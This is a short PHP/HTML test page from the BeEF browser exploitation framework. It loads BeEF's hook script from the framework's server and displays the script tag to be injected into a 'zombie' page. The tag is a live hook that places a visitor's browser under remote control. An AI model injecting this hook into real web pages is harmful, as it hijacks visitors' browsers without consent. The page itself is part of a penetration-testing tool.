<?
	require_once("../include/config.inc.php");
?>
<html>
<head>
	<title>BeEF Test Page</title>
	<link rel="stylesheet" type="text/css" href="../css/firefox/style.css">
		<link rel="icon" href="favicon.ico" type="image/x-icon">
</head>
<body>
	<img src="../images/beef.gif" alt="BeEF"/>BeEF Test Page<br><br>

	<script language='Javascript' src="<?=BEEF_DOMAIN?>hook/beefmagic.js.php"></script>
	
	The following code needs to be included in the zombie:<br>
	<code>
	&#x3C;script language='Javascript'
	src="<?=BEEF_DOMAIN?>hook/beefmagic.js.php'&#x3E;&#x3C;/script&#x3E;
    </code>
    <br>
    
</body>
</html>
